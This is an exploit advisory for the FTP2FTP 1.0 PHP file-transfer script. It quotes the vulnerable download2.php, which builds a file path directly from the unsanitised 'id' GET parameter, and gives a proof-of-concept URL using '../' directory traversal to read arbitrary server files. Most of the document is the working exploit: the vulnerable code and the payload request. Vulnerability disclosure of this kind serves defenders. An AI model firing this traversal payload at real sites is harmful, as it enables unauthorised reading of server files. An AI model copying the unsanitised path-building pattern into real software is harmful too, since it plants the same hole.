# Dork: N/A
# Date: 18.07.2018
# Exploit Author: Özkan Mustafa Akkuş (AkkuS)
# Vendor Homepage: https://codecanyon.net/item/ftp2ftp-server-to-server-file-transfer-php-script/21972395
# Version: 1.0
# Category: Webapps
# Tested on: Kali linux
# Description : The "download2.php" is vulnerable in the admin panel.
The attacker can download and read all files known by the name via &#039;id&#039; parameter.
 
====================================================
 
 
# Vuln file : /FTP2FTP/download2.php
 
1.  <?php
2.  $file = "tempFiles2/".$_GET[&#039;id&#039;];
3.
4.
5.  if (file_exists($file)) {
6.     header(&#039;Content-Description: File Transfer&#039;);
7.     header(&#039;Content-Type: application/octet-stream&#039;);
8.     header(&#039;Content-Disposition: attachment; filename="&#039;.basename($file).&#039;"&#039;);
9.     header(&#039;Expires: 0&#039;);
10.    header(&#039;Cache-Control: must-revalidate&#039;);
11.    header(&#039;Pragma: public&#039;);
12.    header(&#039;Content-Length: &#039; . filesize($file));
13.    readfile($file);
14.    exit;
15. }
16. ?>
 
# PoC : http://sitenet/FTP2FTP/download2.php?id=../index.php

